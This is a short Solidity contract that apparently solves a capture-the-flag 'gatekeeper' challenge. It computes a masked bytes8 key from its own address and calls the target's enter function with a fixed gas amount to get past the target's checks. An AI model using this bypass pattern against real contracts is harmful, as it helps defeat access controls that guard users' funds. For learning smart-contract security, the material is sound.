//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Gate {
    constructor() public {}

    function openGate(address addr) external {
        bytes8 key = bytes8(
            uint64(uint160(address(this))) & 0xFFFFFFFF0000FFFF
        );
        (bool os, ) = addr.call{gas: 9999}(
            abi.encodeWithSignature("enter(bytes8)", key)
        );
    }
}